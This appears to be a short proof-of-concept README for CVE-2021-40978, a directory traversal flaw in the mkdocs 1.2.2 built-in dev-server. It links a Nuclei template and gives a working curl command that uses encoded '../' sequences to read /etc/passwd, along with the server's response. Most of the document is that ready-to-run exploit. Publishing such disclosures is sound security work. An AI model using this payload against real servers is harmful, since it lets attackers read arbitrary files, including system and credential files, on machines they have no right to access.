# CVE-2021-40978
mkdocs built-in dev-server directory traversal exploitation

Mkdocs 1.2.2 allows directory traversal through the built-in dev-server which responds on port 8000.
There is below some examples of successfully exploited paths:

## Impact
Using this tecnique it is possible to fetch files outside of the root directory, allowing anyone to read and download arbitrary files.

![image](https://user-images.githubusercontent.com/15092748/135782666-a909e804-2efd-4735-81a9-30c1561c9742.png)

#### Request:
![image](https://user-images.githubusercontent.com/15092748/135782696-1383f999-4943-4b52-a57a-95a60119ae23.png)

#### Response:
![image](https://user-images.githubusercontent.com/15092748/135782767-bc531a35-cb85-45eb-9323-b397eae422e1.png)

## Proof Of Concept

### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-40978.yaml) Template: https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-40978.yaml

```
curl http://0.0.0.0:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -i
HTTP/1.0 200 OK
Date: Mon, 04 Oct 2021 02:13:38 GMT
Server: WSGIServer/0.2 CPython/3.7.3
Content-Type: application/octet-stream
Content-Length: 2187

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync...
```

![Screenshot_20211003_231812](https://user-images.githubusercontent.com/62824857/135784709-25add5c6-07e3-4ecb-90ce-f8c205ffaca4.png)
